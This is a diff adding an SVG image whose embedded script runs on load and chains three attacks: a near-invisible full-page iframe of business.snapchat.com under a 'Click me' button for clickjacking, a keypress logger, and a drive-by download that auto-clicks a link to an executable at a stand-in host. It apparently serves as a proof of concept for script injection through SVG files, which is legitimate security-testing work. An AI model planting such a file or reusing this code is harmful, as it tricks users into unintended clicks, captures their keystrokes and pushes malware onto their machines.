@@ -1,0 +1,58 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" onload="init()">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      function init() {
+         clickjack();
+         keylogger();
+         driveByDownload();
+      }
+
+      function clickjack() {
+         var iframe = document.createElement('iframe');
+         iframe.style.width = '100%';
+         iframe.style.height = '100%';
+         iframe.style.opacity = '0.01';
+         iframe.style.position = 'absolute';
+         iframe.style.top = '0';
+         iframe.style.left = '0';
+         iframe.src = 'https://business.snapchat.com';
+         document.body.appendChild(iframe);
+         
+         var button = document.createElement('button');
+         button.innerHTML = 'Click me';
+         button.style.position = 'absolute';
+         button.style.top = '60px';
+         button.style.left = '60px';
+         button.style.zIndex = '10';
+         document.body.appendChild(button);
+      }
+
+      function keylogger() {
+         var log = '';
+         document.onkeypress = function(e) {
+            log += e.key;
+            document.getElementById('keylog').innerText = log;
+         };
+         var div = document.createElement('div');
+         div.id = 'keylog';
+         div.style.position = 'absolute';
+         div.style.top = '100px';
+         div.style.left = '50px';
+         div.style.backgroundColor = 'white';
+         div.style.padding = '10px';
+         document.body.appendChild(div);
+      }
+
+      function driveByDownload() {
+         var link = document.createElement('a');
+         link.href = 'https://example.com/malicious.exe'; // Zararlı dosyanın URL'si
+         link.download = 'malicious.exe';
+         document.body.appendChild(link);
+         link.click();
+         document.body.removeChild(link);
+      }
+   </script>
+</svg>
